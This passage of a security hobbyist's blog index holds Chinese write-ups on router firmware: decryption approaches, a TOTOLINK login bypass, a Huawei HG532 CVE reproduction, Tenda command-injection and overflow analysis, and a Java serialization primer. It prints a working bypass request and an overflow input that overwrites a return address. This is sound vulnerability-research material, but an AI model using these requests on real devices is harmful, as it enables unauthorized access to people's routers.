&#125;","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"关于我","slug":"余/aboutMe","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/9ff79b23.html","link":"","permalink":"http://example.com/article/9ff79b23.html","excerpt":"","text":"我 p1yang 21（年轻人，不讲武德） rewirte战队成员（感谢我的几位好哥哥带我） 万年单身狗（有喜爱狗狗的小姐姐可以考虑下） 一个网络安全爱好者（师傅们带带我） 菜鸡（这是真的） 二进制玩家（这玩意好难，好难，好难！！！） android开发专业废物（我ui画的贼溜） 复制诗歌爱好者（致橡树我真的太喜欢了！！！） 初音厨（即使离婚了我也爱她） ”日常“番爱好者（没有未来的未来不是我想要的未来） 正在学画本子的渣渣（哎嘿嘿） 英雄联盟万年黑铁（我闪现撞墙贼溜） 爹一只会窝在后排打狙（十倍镜都打不到人） csgo皮肤收藏家（就是买不起而已，rush B gogogo！） 这个博客算是第二次迁移了吧，之前在云服务器上的也停了，文章也没来得及保存。 这里就算一个新的开始吧。 最后留个联系方式吧，师傅们有想要交流的技术或者不嫌弃我菜，一块耍爹1或者本人博文有问题的地方联系qq提醒我修改吧。 qq：397712823","categories":[{"name":"杂七杂八的唠叨话","slug":"杂七杂八的唠叨话","permalink":"http://example.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%94%A0%E5%8F%A8%E8%AF%9D/"}],"tags":[],"keywords":[{"name":"杂七杂八的唠叨话","slug":"杂七杂八的唠叨话","permalink":"http://example.com/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%94%A0%E5%8F%A8%E8%AF%9D/"}]},{"title":"路由器固件解密思路","slug":"iot/iot固件解密思路","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/876237c8.html","link":"","permalink":"http://example.com/article/876237c8.html","excerpt":"","text":"学习思路来源于zdi：https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware 关于如何判断是否加密在另一篇文章有提到： https://p1yang.github.io/2022/04/02/iot/iot学习感悟/ 一般来说固件加密有三种情况： 初始版本未加密，后续某个版本加密了 在加密与初始版本中间某个版本附带了解密程序 ​ 获取中间版本，从中分析解密程序。 老版有加密，后续更换加密方式，中间发布未加密的过渡版本固件 ​ 与1类似，也是同样获取带有解密程序的过渡版本固件分析提取解密程序 老版有加密，后续更换加密方式，中间更换了新的未加密的解密程序 ​ 如果清楚早期加密方式，或者拥有早期解密程序，可以去分析更换解密程序的中间版本，来获取解密程序。 ​ 如果没有早期相关解密信息，则无法使用上面方式，更多是购买设备，从硬件直接提取未加密的固件。 ​ 理论上，可以使用二进制对比分析工具，来分析尝试提取复原解密程序。 这是选用了经典的Dlink-DIR882的固件进行分析： ftp：ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/ 从固件时间顺序往早期查验 发现DIR882A1_FW104B02_Middle_FW_Unencrypt.bin就是我们所说的过渡版本。 提取，分析，我们要通过他来查找解密程序。 或者复现根据升级路径来查找。 这里比较幸运通过关键字查到在bin下的imgdecrypt，但我们不能确定他一定是正确的解密程序 我们尝试执行他。 跟上面对比，正确能够被识别出文件。 尝试将其他固件也都测试下 上面是命名比较规范的一种，有些命名不规范可能需要去根据前端升级去寻找相应的功能。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"totolink后台登录绕过","slug":"iot/TOTOLINK后台登录绕过","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/b3e9da69.html","link":"","permalink":"http://example.com/article/b3e9da69.html","excerpt":"","text":"型号：X5000R AX1800 无线双频千兆路由器 下面有分析思路，设备模拟过程比较靠近新手，师傅们可以直接跳到后面分析过程。 漏洞 登陆页面构造参数，无需密码 formLoginAuth.htm?authCode&#x3D;1&amp;action&#x3D;login 可直接绕过登陆，进入后台 产生原因在lighttpd wen服务文件from_login函数中 if (iVar2 == 0) &#123; iVar1 = strcmp((char *)&amp;sa58,&quot;ie8&quot;); if (iVar1 == 0) &#123; pcVar1 = &quot;/login_ie.html&quot;; &#125; else &#123; iVar1 = atoi((char *)&amp;sa58); if (iVar1 == 1) &#123; ​ pcVar2 = &quot;/login.html&quot;; ​ pcVar1 = &quot;http://%s%s%s&quot;; ​ pcVar3 = &quot;/phone&quot;; LAB_409114: ​ sprintf(param_2,pcVar1,acStack1860,pcVar3,pcVar2); ​ return 1; &#125; pcVar1 = &quot;/login.html&quot;; &#125; sprintf(param_2,&quot;http://%s%s&quot;,acStack1860,pcVar1); return 1; &#125; 上面代码是登陆检查，当iVar2&#x3D;1的时候，直接跳过检查，不需要登陆。 iVar2的值是autoCode参数的值。 所以构造autoCode&#x3D;1即可绕过。 模拟下面是详细分析思路。 今天偶然发现这款非常小众的路由器，至于多小众，我分析这款官方月销15台。 我分析的这款是 AX1800，官方可以直接下载固件。 这款固件超级适合新手第一次分析使用。 binwalk分析 binwalk TOTOLINK_C8343R-1C_X5000R_IP04433_MT7621A_SPI_16M256M_V9.1.0u.6118_B20201102_ALL.web squashfs文件系统，uImage，LZMA压缩文件中应该也是个比较大的内容，直接使用-Me参数递归提取。 binwalk -Me TOTOLINK_C8343R-1C_X5000R_IP04433_MT7621A_SPI_16M256M_V9.1.0u.6118_B20201102_ALL.web 里面有标准的文件系统 查看架构 binwalk ./bin/busybox mips小端序，查看其文件系统瞅瞅有没有什么东西。 有个工具叫firmwalker，可以自动分析文件系统，提取重要文件，我个人觉得不是特别好用。 我比较推荐使用vscode来做分析。 下面是要关注的一些地方 etc/ #这里会存放系统启动文件如openwrt的rcS文件 sbin/ #这里一般会存放厂商制作的功能性文件和提供web服务的文件 www/ #这里会存放一些web静态页面和后台服务文件文件 其他地方也尽量看一下，经验多了就容易清楚哪些文件是做什么的了，没经验就慢慢来。 这里发现了这几个文件： 可以看到他使用了lighttpd 的web服务文件， 一般固件大概会有这几个轻量级httpd文件：lighttpd，httpd，uhppd。 其他的还有很多。 尝试使用qemu-user模拟http服务。 cp (which qemu-mipsel-static) ./ sudo chroot . ./qemu-mipsel-static ./usr/sbin/lighttpd 这里的报错是需要用-f参数指定配置文件，上面已经发现了lighttpd.conf文件。 sudo chroot . ./qemu-mipsel-static ./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf 没有这个文件，这里我们先去把这个路径改一下，在lighttpd.conf中 把它改到固件的系统文件中./var/run/lighttpd.pid，并且去创建这个文件。 运行 这里虽然正常启动，但是如果不挂载文件夹，还是挺多问题的，所以我更倾向使用系统模式。 所以下面的分析都是在系统模式下的。 这里系统模式不做赘述，我写了个脚本，可以很方便启动。 核心文件比较大，大家按文件自行下载 https://people.debian.org/~aurel32/qemu/mips/ 我把脚本放链接放这里 https://gitee.com/p1piyang/backward-analysis/tree/master/ qemu启动 sudo ./start-mipsel.sh sudo 启动 ifconfig eth0 192.168.5.12 up #qemu中设置ip，qemu里边 将文件系统上传 scp -r squashfs-root/ root@192.168.5.12:/root/ #在主机 挂载 chroot ./squashfs-root/ /bin/sh 启动 ./user/sbin/lighttpd -f ./lighttp/lighttpd.conf 分析刚开始是想直接去分析lighttpd的。随手登陆了一下，看了下包。 我个人浅薄的经验，不要单纯去无目的的分析某个应用，我之前犯过这种错误，太容易对着一个程序漫无目的的乱逛，希望你没有这种情况。 这里明显可以看到调用了cgi文件，之前看文件的时候看到了这个东西的。 可以去分析下这个文件。 ghidra open！！！ Link 死大头！！！ search &quot;action&quot;！！！ action&#x3D;login，交叉引用，看一下。 说实话，ghidra的这个伪代码看着老奇怪了，这里是判断了登陆还是升级。 if下面，这里判断flag&#x3D;1，最后的逻辑是将字符串格式化到acStack4456中 再往下这个地方我刚开始比较懵了，因为websGetVar程序查找表变量var,相当于获取参数。所以这里并没有往下看，而是换了个思路点。 这里知道了他是对登陆做了个判断。 去查找登陆的请求参数 发现了这么个地方。 根据登陆的包。 发现他返回了一串地址。并且主动访问了这串地址。 所以这个地方是判断密码的地方。本来想试试正确密码，来分析下，结果密码怎么都不对。 这里解释下，因为我没有设备，是直接在官网下载的固件，所以这个密码怎么都不对，我怀疑是固件模拟的问题，就没有往下追究。 他主动访问了formloginAuth.htm，在www&#x2F;文件夹下并没有这个文件，所以去找下lighttpd文件分析下 ghidra open！！！ Link 死大头！！！ search &quot;formLoginAuth&quot;！！！ 跟进from_Login函数 这里就发现了参数处理 判断几个参数做了什么，userName是空的先不看，goURL是某个html文件，盲猜他是的从哪来的，action是要做什么。 所以现在要看一下authCode 如果authCode不等于0，iVar2就等于整形的authCode的值。 往下分析。 这里改成1之后直接，跳过了这个判断。 但是只吧这个改为1之后还是返回到登陆界面。 这里pcVar2&#x3D;1，导致跳过了设置pcVar2 &#x3D; home.html 所以我猜测goUrl参数不是从哪来，而是从哪去。 最后发现果然是哦。 其实在ghidra反编译的时候，好多地方不太习惯，很多地方靠函数名和字符串硬猜。 慢慢来吧。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"iot学习感悟","slug":"iot/iot学习感悟","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/41f88cb3.html","link":"","permalink":"http://example.com/article/41f88cb3.html","excerpt":"","text":"关于加密前期接触iot我们遇到固件基本都是binwalk一把梭，但有时候会遇到固件信息混乱，或者分析出来一堆zlma的文件，没有发现有rtos或者文件系统的标志。 这时候会考虑到是否加密，上网查会发现有用 binwalk 的 -E 参数来判断。 那么这个判断的原理是啥？ 原理是信息熵。 熵：泛指某些物质系统状态的一种量度，某些物质系统状态可能出现的程度。 初高中应该都学过，熵值越大，说明系统越混乱。 信息熵：1948年C.E.Shannon（香农）从热力学中借用过来提出的概念，解决了对信息的量化度量问题 信息中，重复的内容越多，系统越稳定，能获得的信息越多。 对于没有加密的二进制文件来说，某些指令出现的频率通常很高（如序言、nop序列等），并且数据结构几乎没有随机性。重复概率很高 所以，对于未加密的数据来说熵值一般会比较低。 对于经过加密的文件来说，都会想尽办法隐藏自己的信息，而导致很少有重复的内容，也就导致重复概率低 所以，加密的熵值一般都会高。 上面就是通过信息熵来判断是否加密，binwalk使用相关算法来整理信息熵 关于web服务嵌入式的web服务通常是cgi+http 或 lua+http cgi是叫公共网关接口，是Web 服务器运行时外部程序的规范，按CGI 编写的程序可以扩展服务器功能 Lua 是一种轻量小巧的脚本语言,用标准C语言编写并以源代码形式开放, 其设计目的是为了嵌入应用程序中,从而为应用程序提供灵活的扩展和定制功能。 常见的嵌入式设备使用的web服务多为以下几款 boa单一任务型的http服务器，只会对CGI请求进行fork进程，没有访问控制功能，身份认证都是厂商后边开发的。 通过translate_uri函数解析请求路径I判断是否为CGI请求，调用init_cgi来execve执行相关CGI程序 translate_uri函数中的init_script_alias函数，负责解析ScriptAlias请求，设置请求cgi类型，查看文件是否存在以及具有相关权限 通过ScriptAlias在boa.conf配置文件中，该指令设置CGI执行的真实目录 不止是boa，nginx的设置中也存在alias，小米路由器就曾因为这个设置导致路径穿越 uhttpdopenwrt的默认http服务器，主要是为了和LucI Web接口方便OpenWrt设备管理。 支持与cgi，lua，UBUS来完成请求。 uhttpd使用LuCI框架编写lua处理脚本，安全审计偏向于Web安全中的代码审计。 但也有一些存放的lua脚本是编译过的，需要逆向。 uhttp下dispatch_find函数根据请求的url找到合适的dispatch_handler。 请求的url通过check_cgi_path函数校验，则会调用cgi_handle_request函数回调cgi_main函数execl执行对应的CGI程序 最终调用的/www/cgi-bin/luci即Luci，luci是MVC设计思想的web后端框架。 简单了解下，后面一款小米路由器分析思路会详细介绍 Goahead在route.txt定义的路由规则，根据匹配的URI来执行不同的handler：有action handler直接在GoAhead进程中执行C函数，CGI handler执行新的CGI程序，也有默认的file handler处理文件请求，还可以自定义新的handler 详细请看官方文档：https://www.embedthis.com/goahead/doc/ 调用websUrlHandlerRequest函数找到匹配URL前缀的处理函数，可以借助websFormDefine函数定义与formName相关联的C处理函数 由上面几个可以看出来，都是通过URL来选择执行CGI&#x2F;lua或是内部程序 并且根据PATH_INFO选择执行程序内最终的handler函数。 这里属于个人复述，这个文章比较详细：https://github.com/Larryxi/Larryxi.github.io/blob/master/_posts/2020-02-03-iot-web-server-cgi-handler-analysis.md 分析的一些思路分析的话根据上面的东西来看 一定要有个设备，或者去模拟这些设备。 保证正常的web访问，方便查看功能调用的url&#x2F;接口。 一定不要去公网站直接用人家的设备，要做个守法的好孩子！！！ 根据上面的知识来获取相关功能的具体实现位置。 然后分析危险函数，以及是否可控。 或者 从危险函数向外分析功能点。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"CVE-2017-17215(华为HG532远程命令执行漏洞)","slug":"iot/CVE-2017-17215","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/3a44f1fa.html","link":"","permalink":"http://example.com/article/3a44f1fa.html","excerpt":"","text":"固件和exp都已经放在这个地方了：https://gitee.com/p1piyang/backward-analysis/tree/master/ 建议先通一遍文章再动手复现，复现之前一定要保存虚拟机快照，防止出现各种奇奇怪怪的问题 首先要解决环境问题，这里只做配置说明，iot分析环境专门有一篇，请去看IOT固件分析环境搭建 的binwalk，qemu 解压固件直接使用binwalk -Me HG532eV100R001C02B015_upgrade_main.bin命令来直接解压固件文件 解压完成后，在固件同文件夹下可以看到解压出来的文件夹 文件夹中的squashfs-root就是我们需要的文件系统了，如果squashfs-root中没有下图的各种文件系统，就是你的binwalk有不完整，去看iot固件分析环境搭建 配置网络我们要让qemu虚拟机和我们的ubuntu互通。 安装网络配置工具 apt-get install bridge-utils uml-utilities 修改ubuntu网络配置文件 /etc/network/interfaces/sudo vim 你一定会把！ 内容改成如下，图下提供了复制粘贴的代码（贴心人） # interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback auto ens33 iface ens33 inet manual up ifconfig ens33 0.0.0.0 up auto br0 iface br0 inet dhcp bridge_ports ens33 bridge_maxwait 0 创建或修改qemu的网络接口启动文件脚本/etc/qemu-ifup如果没有这个文件直接创建就可以了，如果有的话将里边内容清空，然后写入下面脚本 #!/bin/sh # Script to bring a network (tap) device for qemu up. # The idea is to add the tap device to the same bridge # as we have default routing to. # in order to be able to find brctl echo &quot;Executing /etc/qemu-ifup&quot; echo &quot;Bringing $1 for bridge mode...&quot; sudo /sbin/ifconfig $1 0.0.0.0 promisc up echo &quot;Adding $1 to br0...&quot; sudo /sbin/brctl addif br0 $1 sleep 3 然后依次执行如下操作 #启动桥接网络赋予可执行权限 sudo chmod a+x /etc/qemu-ifup #重启网络服务，使配置生效（注意这个地方配置正常之后，如果你是mac，可能会让你输入mac密码，windows我不知道😬） sudo /etc/init.d/networking restart #关闭ens33，启动桥接网络br0（这里如果显示eth0不存在没关系，直接启动br0） sudo ifdown eth0 sudo ifup br0 如图所示，当前网卡为br0 配置完之后，如果下面qemu虚拟机配置之后，仍然无法获取ip，重启ubuntu 配置qemu虚拟机先去下载debian-mips-qemu镜像文件，每次固件分析要注意对应大小端序的镜像文件（还是有设备的好😭） 下载地址：https://people.debian.org/~aurel32/qemu/mips/ 我们需要红框里的两个文件，然后在文件所在地方启动qemu 这里特别说明，最后一个参数-nographic带上是在终端中直接运行，不会弹出窗口运行，建议一定不要开，我这里开了之后这个窗口的返回快捷键和vmware的一模一样，就导致我只能在mac和qemu中间用，我回不去我的ubuntu了。 sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic 如果你的多次运行qemu，可能会出现如下错误 这是服务没有退出导致的 ps查出当前qemu进程号，kill掉就好了 ps -e | grep ‘qemu’ sudo kill 3307 即可 启动如上图，账号密码都是root 启动后尝试，ping baidu.com 和 ubuntu 如果不通 ifconfig -a 查看网卡第一个是什么，一般都会是eth1 然后修改/etc/network/interfaces，注意这里是在qemu虚拟机中修改 nano /etc/network/interfaces 第一次配置红框中一般是eth0，将红框中的内容修改为你的网卡名字 保存后使用下面指令重启eth1 ifup eth1 再次尝试，如果还不行或者ifconfig发现eth1没有分配地址，重启ubuntu或者找原因🤔，不行就恢复快照 如果成了的话是可以用ssh远程连接qemu虚拟机的 ssh root@虚拟机ip 建议在ubuntu中使用ssh连接，比较方便 接下来将我们解压出来的文件系统拷贝到qemu scp -r ./squashfs-root root@虚拟机ip:/root/ 复现通过checkpoint报告中能看到关键字为ctrl和Deviceupgrade，端口号为37215 使用grep来查找 两个都指向upnp这个文件，端口号指向mic这个文件 直接运行会出问题，我们切换根目录到拷贝进来的系统文件中 chroot /root/squashfs-root /bin/sh 然后先后运行upnp和mic 到这个地方mic已经运行成功了，放着不用管他了 使用lsof -i:37215可以查看端口是否运行 用下面命令来查看是否启动成功 nc -vv 192.168.150.9 37215 成功了就可以跑exp了 与checkpoint不同的是，我把溢出的命令修改了（红框处，这里就是灵活使用了），蓝框处修改为qemu的ip 执行exp后 在mic界面可以看到 ls被成功执行了。 原因分析Ida7.5可以反编译qemu🥳 通过exp能发现，命令行放在了NewStatusURL标签下，在ida中通过字符串查找 49c的位置使用快捷间p可以创建函数，来反编译 snprintf函数将可变个参数按照format格式化成字符串，然后将其复制到str中，即把v5与前面字符串拼接放到v6中，并且system执行了v6 根据exp的执行效果来推测，ATP_XML_GetChildNodeByName这个函数读取NewStatusURL标签的内容放到了v5。 伪代码不可信，尽量还是通过汇编代码分析 倒推能发现，system的参数为0x42C+var_414($sp) 0x42C+var_414($sp)为snprintf 的第一个参数，0x42C+var_40C($sp)为snprintf的第四个参数 即 0x42C+var_40C($sp)的内容通过函数放到了0x42C+var_414($sp) 而0x42C+var_40C($sp)为ATP_XML_GetChildNodeByName的一个参数，这里应该是读取后放到了0x42C+var_40C($sp) ida的锅🙃，没有办法ATP_XML_GetChildNodeByName做具体分析，但通过网上一些师傅的文章，应该大差不差了 然后了解原理我们就可以通过闭合来实现命令运行了。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"tenda路由器的漏洞发现","slug":"iot/tenda路由器的漏洞发现","date":"2022-07-20T09:57:32.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/44df6587.html","link":"","permalink":"http://example.com/article/44df6587.html","excerpt":"","text":"分析这款是tendaA1206，固件是比较早的未加密的那个。 都是些个人学习过程中的思考与知识，整理下来。 固件在这：https://p1yang.github.io/2022/04/22/iot/tenda路由器的漏洞发现/ 前期准备都是些老生常谈的东西可以跳过。 这里使用的qemu-user，方便 至于分析的文件在下面思路中会聊到，这里环境模拟启动的是&#x2F;bin&#x2F;httpd 文件 复现环境是qemu+ghidra(反编译伪代码，我个人比较习惯ghidra的伪代码)+ida7.5(动态调试) binwalk解包，文件格式，qemu-user模式启动等这些就不赘述，主要说几个环境模拟时的几个小问题。 问题1 第一次运行时爆出这个错误停止。string大法发现在main中 apmib_init函数从flash中读取mib值到RAM中，像这种模拟是办不到的东西，直接patch代码或更改寄存器值来绕过(尝试了下没办法直接patch代码，可以试试patch机器码，比较麻烦，我就直接改寄存器了) 在mips的判断是bne，btgz等，将断点下在他们上，他们通常依靠v0寄存器的值来做判断。 此时v0值为0，改为1跳过 问题2这里陷入个死循环，问题点在 也尝试更改寄存器v0的值成功绕过。 问题3 继续string大法 抱歉这里我并没有查到这个函数的是干什么的，有清楚的请告诉我，提前感谢。 不影响，改寄存器大法。 问题4上面没问题之后发现ip开在255.255.255.255上。 string大法搜 listen ip inet_ntoa函数的意思是，功能是将网络地址转换成“.”点隔的字符串格式。 所以跟sockaddr.sin_port有关，查看引用 inte_addr 功能是将一个点分十进制的IP转换成一个长整型数（u_long类型）等同于inet_addr()。 与host有关，再向前查看 其参数为全局变量 g_lan_ip。设置个lanip sudo tunctl -t br0 -u ‘用户名’ sudo ifconfig br0 192.168.5.1&#x2F;24 ps eth1就是第二块网卡第一块通常是eth0 tap是虚拟网络接口 br是网桥 这个设置完之后问题2直接解决了。 分析思路分析其使用的web服务器，常见的嵌入式有以下几种：httpd，uhttpd，gohead，lighttpd，boa 还有其他的，我没咋见过，就不写了，用到的话自行查阅（懒！） 我分析这款使用的是httpd，在bin目录下，一般服务器文件都在一下几个目录，不排除其他目录 /user/bin/ /user/sbin/ /bin/ 在逆向分析httpd时，尽量关注一些自定义功能代码，main下调用的initwebs函数中，配置了前端访问方式 可以看到默认页面main， websSetPassword设置访问口令，不多说各位调试的时候可以关注一下。 websUrlHandlerDefine需要关注，这个函数的意思是什么样的url交给谁处理。 上面说了尽量关注一些自定义功能代码 这里的自定义功能代码就在formDefineTendDa中 上面这些都是通过goform来处理的，所以其访问形式为 http://127.0.0.1:80/goform/TendaGetLongString这样的 哪个路径就交由哪个函数来处理。 下面分析可以由两方面展开： 分析各个功能点 简单来说就是将所有接口的代码过一遍，去分析参数从哪里来，有没有经过什么危险函数 这种的话效率比较低，我个人推荐第二种 通过危险函数来查找可利用点，利用逆向分析工具的交叉编译功能查找 这里放一张危险函数表 dosystemcmd system 根据上面的函数表来将危险函数过一下 下面是之前分析到的两个问题的思路，住这里不涉及exp，poc等脚本的编写，还是以思路为主。 命令执行过一遍dosystemcmd函数 可以看到有145次调用，感觉有漏洞的几率还是挺大的 注意点，尽量找form这类的函数，即上面说的自定义功能，有前后端交互 且危险函数的参数来自于前端参数 websGetVar就是从wp中获取其第二个参数对应的值，如果没有该参数，值默认为第三个参数。 上面可以看到这里pcVar1未作任何处理直接拼接到参数中。 这里就产生了命令执行，不多做赘述，各位有兴趣可自行复现。 溢出溢出是在strpintf函数的调用中发现的。 goform&#x2F;NatStaticSetting路径访问到fromNatStaticSetting函数 sprintf函数将page的参数给拼接到字符串中，未做长度校验，导致溢出 复现过程： 断点到fromNatStaticSetting函数入口 将调用fromNatStaticSetting函数的返回地址放入0x407FFAE4 处 向下执行到第三个websGetVar函数获取page参数，然后向下执行sprintf函数，将page参数的内容拼接到gotopage内，由代码可知长度为256 参数初始化完毕后发现gotopage位置为0x407FF9E0 这里我们传入page参数为： page=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaacAAAA 执行完后 返回地址0x407FFAE4已经被AAAA覆盖。 上面是一些思路之类的东西，第一个命令执行晚了几天。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"java序列化与反序列化","slug":"技/java序列化与反序列化","date":"2022-03-16T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/335a6663.html","link":"","permalink":"http://example.com/article/335a6663.html","excerpt":"","text":"java序列化指的是将java对象转化为字节序列的过程java反序列化指字节序列恢复到java对象 基础知识 计算机内存最小单位为一个二进制位，即 0或1我们吧这个二进制位称为一个bit（比特）位 一个字节（byte）有八个比特位，即 byte &#x3D; 8*bit如果八个bit位都为1，即这个字节最大为 FF &#x3D; 1111 1111 一个字（word）是两个byte，即 word &#x3D; 2 * byte &#x3D; 16 * bit则一个字最大为 FFFF doubleword 双字，是两个word ，即四个byte，32*bit一个doubleword为FFFF FFFF 一般情况下使用最多的是字节，字节相当于人民币的元一样，虽然不是最低的，但却是最常用的 一串字符在内存中一般是以ascii编码形式存在，不同编码占用子节长度不同 一个ascii码的占用一个字节 unicode码占用一个字（两个字节）utf-8 是我们国内常用的是针对unicode码的一种可变编码方式。asciiunicode字节序当一串数据太大的时候，一个字节放不下，就需要使用多个字节比如0x12345678就需要四个字节而现在就有了两种存放方式我们称这两种为 小端序和大端序小端序从屁股开始，大端序从头开始小端序大端序各家架构不同，使用的大小端序不同，无需纠结但是后来计算机网络通信出来了，大家如果有不同的话会导致混乱tcp&#x2F;ip协议出来之后就规定网络通信必须使用大端序以上就是字节序的基本知识 序列化与反序列化序列化： 对象序列化的最主要的用处就是在传递和保存对象的时候，保证对象的完整性和可传递性。序列化是把对象转换成有序字节流，以便在网络上传输或者保存在本地文件中。序列化后的字节流保存了Java对象的状态以及相关的描述信息。序列化机制的核心作用就是对象状态的保存与重建。 反序列化： 客户端从文件中或网络上获得序列化后的对象字节流后，根据字节流中所保存的对象状态及描述信息，通过反序列化重建对象。 序列化就是把实体对象状态按照一定的格式写入到有序字节流，反序列化就是从有序字节流重建对象，恢复对象状态。 上面的简单点说，进程间通信可以将图片，视频，音频等信息用二进制方式传输。但是进程间的对象却不能这么搞。 比如我创建了一个User u1 &#x3D; new User(1,”a”,100);我要将它传给另一个软件（进程）进程间的对象想要传输就需要序列化和反序列化序列化为二进制数据，可以永久存在硬盘里，也可以进行网络传输 实现java序列化和反序列化下面嫌太长了可以直接看例子 JDK类库中序列化和反序列化APIjava.io.ObjectOutputStream： 表示对象输出流；它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中；java.io.ObjectInputStream：表示对象输入流；它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回； 实现序列化的要求 只有实现了Serializable或Externalizable接口的类的对象才能被序列化，否则抛出异常！ 实现Java对象序列化与反序列化的方法若User类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化 ObjectOutputStream采用默认的序列化方式，对User对象的非transient的实例变量进行序列化。ObjcetInputStream采用默认的反序列化方式，对对User对象的非transient的实例变量进行反序列化。 若User类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)，则采用以下方式进行序列化与反序列化。 ObjectOutputStream调用User对象的writeObject(ObjectOutputStream out)的方法进行序列化。ObjectInputStream会调用User对象的readObject(ObjectInputStream in)的方法进行反序列化。 若User类实现了Externalnalizable接口，且User类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化。 ObjectOutputStream调用User对象的writeExternal(ObjectOutput out))的方法进行序列化。ObjectInputStream会调用User对象的readExternal(ObjectInput in)的方法进行反序列化。 实例user对象，使用的是上述第一种方式，所以User要实现Serializable import java.io.Serializable; public class User implements Serializable &#123; int id; String name; String phone; #一些get set 构造参数，这里就不列举了 &#125; 序列化与反序列化 import java.io.*; public class userDemo &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; //创建对象 User u1 = new User(1,&quot;AAAAAAA&quot;,&quot;110&quot;); //被序列化的对象 User u2; //反序列化的对象 //序列化 getSerial(u1); //反序列化 u2 = backSerial(); System.out.println(u2.getName()); &#125; //序列化 static void getSerial(User u1) throws IOException &#123; FileOutputStream fos = new FileOutputStream(&quot;obj.out&quot;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(u1); oos.flush(); oos.close(); &#125; //反序列化 static User backSerial() throws IOException, ClassNotFoundException &#123; FileInputStream fis = new FileInputStream(&quot;obj.out&quot;); ObjectInputStream ois = new ObjectInputStream(fis); User u1 = (User) ois.readObject(); return u1; &#125; &#125; 序列化底层分析ObjdectOutputStream对象的初始化 bout是数据输出流的底层writeStreamHeader将文件头写入文件这里根据序列化的文件分析所以这里是写入文件头，表示声明使用序列化协议以及说明序列化版本初始化完毕，文件存在且写入了文件头。开始序列化写入文件writeObject(u1);向下调用write0ject0();这个方法的内容比较长重要点在意思是按照不同类型的方法去写入序列化数据，可以看上面实现Java对象序列化与反序列化的方法我们实例中实现了Serializable，所以执行writeOrdinaryObject方法bout.writeByte(TC_OBJECT); 写入了0x73调用 writeClassDesc(desc, false);跟进这里isProxy是判断类是否是动态代理模式 具体可以自行了解，我也不清楚因为我们实例的类不是动态代理，所以跟进writeNonProxyDesc();先写入了描述符号0x72下面判断跟进两个参数一个为1，一个为2跟进writeClassDescriptor(desc);和true执行同一个方法在开发中，我们经常会遇到要经过for循环来判断该循环体中是否包含或不包含某一元素，这个时候我们也常用一个boolean值来介入判断。而“|&#x3D;”可以轻松的让我们完成实现 boolean flag &#x3D; false; 在一个循环体中，flag |&#x3D; (c&#x3D;&#x3D;e);如果一直不相等，则flag一直为false,一旦有一个相等则为true； out.writeUTF(name); 写入类名out.writeLong(getSerialVersionUID());写入序列化uid 再往下一堆if判断接口的实现方式，将标志位写入out.writeByte(flags); 我们使用serializable，所以应该写入0x02所以从0x000B - 0x0013 都是序列化uid然后调用writeShort写入两个字节的域长度（比如说有3个变量，就写入 00 03 )实例中有三个参数接下来就是循环写入变量名和变量类型 每轮循环: writeByte写入一个字节的变量类型; writeUTF()写入变量名 判断是不是原始类型，即是不是对象 不是原始类型(基本类型)的话，就调用writeTypeString()这个writeTypeString()，如果是字符串，就会调用writeString() 而这个writeString()往往是这样写的，字符串长度(不是大小)小于两个字节，就先写入一个字节的TC_STRING(16进制 74)，然后调用writeUTF()，写入一个signature，这好像跟jvm有关，最后一般写的是类似下面这串 74 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 